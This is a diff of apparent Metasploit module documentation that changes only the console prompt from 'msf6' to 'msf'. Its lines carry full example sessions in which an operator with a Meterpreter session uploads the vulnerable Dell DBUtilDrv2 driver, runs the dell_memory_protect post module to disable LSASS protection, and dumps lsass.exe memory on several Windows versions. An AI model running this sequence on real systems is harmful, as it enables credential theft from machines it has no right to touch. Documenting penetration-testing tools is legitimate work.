@@ -111,8 +111,8 @@ Process List
 
 meterpreter > background
 [*] Backgrounding session 1...
-msf6 exploit(multi/handler) > use post/windows/gather/memory_dump
-msf6 post(windows/gather/memory_dump) > options
+msf exploit(multi/handler) > use post/windows/gather/memory_dump
+msf post(windows/gather/memory_dump) > options
 
 Module options (post/windows/gather/memory_dump):
 
@@ -123,19 +123,19 @@ Module options (post/windows/gather/memory_dump):
    PID                         yes       ID of the process to dump memory from
    SESSION                     yes       The session to run this module on
 
-msf6 post(windows/gather/memory_dump) > set SESSION 1
+msf post(windows/gather/memory_dump) > set SESSION 1
 SESSION => 1
-msf6 post(windows/gather/memory_dump) > set PID 740
+msf post(windows/gather/memory_dump) > set PID 740
 PID => 740
-msf6 post(windows/gather/memory_dump) > set DUMP_PATH C:\\Windows\\Temp\\lsass_dump
+msf post(windows/gather/memory_dump) > set DUMP_PATH C:\\Windows\\Temp\\lsass_dump
 DUMP_PATH => C:\Windows\Temp\lsass_dump
-msf6 post(windows/gather/memory_dump) > run
+msf post(windows/gather/memory_dump) > run
 
 [*] Running module against BADBLOOD
 [*] Dumping memory for lsass.exe
 [-] Post aborted due to failure: payload-failed: Unable to open process: Access is denied.
 [*] Post module execution completed
-msf6 post(windows/gather/memory_dump) > sessions -i 1
+msf post(windows/gather/memory_dump) > sessions -i 1
 [*] Starting interaction with 1...
 
 meterpreter > upload /home/albinolobster/drivers/2_7/ C:\\Windows\\Temp
@@ -149,8 +149,8 @@ meterpreter > upload /home/albinolobster/drivers/2_7/ C:\\Windows\\Temp
 [*] uploaded   : /home/albinolobster/drivers/2_7/DBUtilDrv2.sys -> C:\Windows\Temp\DBUtilDrv2.sys
 meterpreter > background
 [*] Backgrounding session 1...
-msf6 post(windows/gather/memory_dump) > use post/windows/manage/dell_memory_protect 
-msf6 post(windows/manage/dell_memory_protect) > options
+msf post(windows/gather/memory_dump) > use post/windows/manage/dell_memory_protect 
+msf post(windows/manage/dell_memory_protect) > options
 
 Module options (post/windows/manage/dell_memory_protect):
 
@@ -161,13 +161,13 @@ Module options (post/windows/manage/dell_memory_protect):
    PID                                  yes       The targeted process
    SESSION                              yes       The session to run this module on
 
-msf6 post(windows/manage/dell_memory_protect) > set SESSION 1
+msf post(windows/manage/dell_memory_protect) > set SESSION 1
 SESSION => 1
-msf6 post(windows/manage/dell_memory_protect) > set DRIVER_PATH C:\\Windows\\Temp
+msf post(windows/manage/dell_memory_protect) > set DRIVER_PATH C:\\Windows\\Temp
 DRIVER_PATH => C:\Windows\Temp
-msf6 post(windows/manage/dell_memory_protect) > set PID 740
+msf post(windows/manage/dell_memory_protect) > set PID 740
 PID => 740
-msf6 post(windows/manage/dell_memory_protect) > run
+msf post(windows/manage/dell_memory_protect) > run
 
 [!] SESSION may not be compatible with this module:
 [!]  * missing Meterpreter features: stdapi_sys_process_set_term_size
@@ -176,8 +176,8 @@ msf6 post(windows/manage/dell_memory_protect) > run
 [*] Reflectively injecting the DLL into 692...
 [+] Exploit finished
 [*] Post module execution completed
-msf6 post(windows/manage/dell_memory_protect) > use post/windows/gather/memory_dump 
-msf6 post(windows/gather/memory_dump) > options
+msf post(windows/manage/dell_memory_protect) > use post/windows/gather/memory_dump 
+msf post(windows/gather/memory_dump) > options
 
 Module options (post/windows/gather/memory_dump):
 
@@ -188,7 +188,7 @@ Module options (post/windows/gather/memory_dump):
    PID        740                         yes       ID of the process to dump memory from
    SESSION    1                           yes       The session to run this module on
 
-msf6 post(windows/gather/memory_dump) > run
+msf post(windows/gather/memory_dump) > run
 
 [*] Running module against BADBLOOD
 [*] Dumping memory for lsass.exe
@@ -196,7 +196,7 @@ msf6 post(windows/gather/memory_dump) > run
 [+] Memory dump stored at /home/albinolobster/.msf4/loot/20211207125102_default_172.16.144.11_windows.process._368616.bin
 [*] Deleting minidump from disk
 [*] Post module execution completed
-msf6 post(windows/gather/memory_dump) > 
+msf post(windows/gather/memory_dump) > 
 ```
 
 ### Windows 10 Build 19044.1348 x64 using DBUtilDrv2 version 2.5
@@ -229,20 +229,20 @@ Process List
 
 meterpreter > background
 [*] Backgrounding session 1...
-msf6 exploit(multi/handler) > use post/windows/gather/memory_dump
-msf6 post(windows/gather/memory_dump) > set SESSION 1
+msf exploit(multi/handler) > use post/windows/gather/memory_dump
+msf post(windows/gather/memory_dump) > set SESSION 1
 SESSION => 1
-msf6 post(windows/gather/memory_dump) > set PID 732
+msf post(windows/gather/memory_dump) > set PID 732
 PID => 732
-msf6 post(windows/gather/memory_dump) > set DUMP_PATH C:\\Windows\\Temp\\lsass_dump
+msf post(windows/gather/memory_dump) > set DUMP_PATH C:\\Windows\\Temp\\lsass_dump
 DUMP_PATH => C:\Windows\Temp\lsass_dump
-msf6 post(windows/gather/memory_dump) > run
+msf post(windows/gather/memory_dump) > run
 
 [*] Running module against DESKTOP-JCD6JN8
 [*] Dumping memory for lsass.exe
 [-] Post aborted due to failure: payload-failed: Unable to open process: Access is denied.
 [*] Post module execution completed
-msf6 post(windows/gather/memory_dump) > sessions -i 1
+msf post(windows/gather/memory_dump) > sessions -i 1
 [*] Starting interaction with 1...
 
 meterpreter > upload /home/albinolobster/drivers/2_5/ C:\\Windows\\Temp\\
@@ -254,14 +254,14 @@ meterpreter > upload /home/albinolobster/drivers/2_5/ C:\\Windows\\Temp\\
 [*] uploaded   : /home/albinolobster/drivers/2_5/DBUtilDrv2.sys -> C:\Windows\Temp\\DBUtilDrv2.sys
 meterpreter > background
 [*] Backgrounding session 1...
-msf6 post(windows/gather/memory_dump) > use post/windows/manage/dell_memory_protect 
-msf6 post(windows/manage/dell_memory_protect) > set SESSION 1
+msf post(windows/gather/memory_dump) > use post/windows/manage/dell_memory_protect 
+msf post(windows/manage/dell_memory_protect) > set SESSION 1
 SESSION => 1
-msf6 post(windows/manage/dell_memory_protect) > set DRIVER_PATH C:\\Windows\\Temp\\
+msf post(windows/manage/dell_memory_protect) > set DRIVER_PATH C:\\Windows\\Temp\\
 DRIVER_PATH => C:\Windows\Temp\
-msf6 post(windows/manage/dell_memory_protect) > set PID 732
+msf post(windows/manage/dell_memory_protect) > set PID 732
 PID => 732
-msf6 post(windows/manage/dell_memory_protect) > run
+msf post(windows/manage/dell_memory_protect) > run
 
 [!] SESSION may not be compatible with this module:
 [!]  * missing Meterpreter features: stdapi_sys_process_set_term_size
@@ -270,8 +270,8 @@ msf6 post(windows/manage/dell_memory_protect) > run
 [*] Reflectively injecting the DLL into 3508...
 [+] Exploit finished
 [*] Post module execution completed
-msf6 post(windows/manage/dell_memory_protect) > use post/windows/gather/memory_dump 
-msf6 post(windows/gather/memory_dump) > run
+msf post(windows/manage/dell_memory_protect) > use post/windows/gather/memory_dump 
+msf post(windows/gather/memory_dump) > run
 
 [*] Running module against DESKTOP-JCD6JN8
 [*] Dumping memory for lsass.exe
@@ -279,7 +279,7 @@ msf6 post(windows/gather/memory_dump) > run
 [+] Memory dump stored at /home/albinolobster/.msf4/loot/20211208072121_default_172.16.144.6_windows.process._495675.bin
 [*] Deleting minidump from disk
 [*] Post module execution completed
-msf6 post(windows/gather/memory_dump) > 
+msf post(windows/gather/memory_dump) > 
 ```
 
 ### Windows Server 2016 (10.0.14393) x64 using DBUtilDrv2 version 2.5 and PID option set to 0
@@ -312,20 +312,20 @@ Process List
 
 meterpreter > background
 [*] Backgrounding session 1...
-msf6 exploit(multi/handler) > use post/windows/gather/memory_dump
-msf6 post(windows/gather/memory_dump) > set SESSIOn 1
+msf exploit(multi/handler) > use post/windows/gather/memory_dump
+msf post(windows/gather/memory_dump) > set SESSIOn 1
 SESSIOn => 1
-msf6 post(windows/gather/memory_dump) > set PID 664
+msf post(windows/gather/memory_dump) > set PID 664
 PID => 664
-msf6 post(windows/gather/memory_dump) > set DUMP_PATH C:\\Windows\\Temp\\lsass_dump
+msf post(windows/gather/memory_dump) > set DUMP_PATH C:\\Windows\\Temp\\lsass_dump
 DUMP_PATH => C:\Windows\Temp\lsass_dump
-msf6 post(windows/gather/memory_dump) > run
+msf post(windows/gather/memory_dump) > run
 
 [*] Running module against WIN-7ESIGFVFQEG
 [*] Dumping memory for lsass.exe
 [-] Post aborted due to failure: payload-failed: Unable to open process: Access is denied.
 [*] Post module execution completed
-msf6 post(windows/gather/memory_dump) > sessions -i 1
+msf post(windows/gather/memory_dump) > sessions -i 1
 [*] Starting interaction with 1...
 
 meterpreter > upload /home/albinolobster/drivers/2_5/ C:\\Windows\\Temp\\
@@ -337,12 +337,12 @@ meterpreter > upload /home/albinolobster/drivers/2_5/ C:\\Windows\\Temp\\
 [*] uploaded   : /home/albinolobster/drivers/2_5/DBUtilDrv2.sys -> C:\Windows\Temp\\DBUtilDrv2.sys
 meterpreter > background
 [*] Backgrounding session 1...
-msf6 post(windows/gather/memory_dump) > use post/windows/manage/dell_memory_protect
-msf6 post(windows/manage/dell_memory_protect) > set DRIVER_PATH C:\\Windows\\Temp\\
+msf post(windows/gather/memory_dump) > use post/windows/manage/dell_memory_protect
+msf post(windows/manage/dell_memory_protect) > set DRIVER_PATH C:\\Windows\\Temp\\
 DRIVER_PATH => C:\Windows\Temp\
-msf6 post(windows/manage/dell_memory_protect) > set SESSION 1
+msf post(windows/manage/dell_memory_protect) > set SESSION 1
 SESSION => 1
-msf6 post(windows/manage/dell_memory_protect) > run
+msf post(windows/manage/dell_memory_protect) > run
 
 [*] Set PID option 664 for lsass.exe
 [*] Launching netsh to host the DLL...
@@ -350,8 +350,8 @@ msf6 post(windows/manage/dell_memory_protect) > run
 [*] Reflectively injecting the DLL into 3008...
 [+] Exploit finished
 [*] Post module execution completed
-msf6 post(windows/manage/dell_memory_protect) > use post/windows/gather/memory_dump
-msf6 post(windows/gather/memory_dump) > run
+msf post(windows/manage/dell_memory_protect) > use post/windows/gather/memory_dump
+msf post(windows/gather/memory_dump) > run
 
 [*] Running module against WIN-7ESIGFVFQEG
 [*] Dumping memory for lsass.exe
@@ -359,5 +359,5 @@ msf6 post(windows/gather/memory_dump) > run
 [+] Memory dump stored at /home/albinolobster/.msf4/loot/20211218041511_default_172.16.144.14_windows.process._536152.bin
 [*] Deleting minidump from disk
 [*] Post module execution completed
-msf6 post(windows/gather/memory_dump) > 
+msf post(windows/gather/memory_dump) > 
 ```
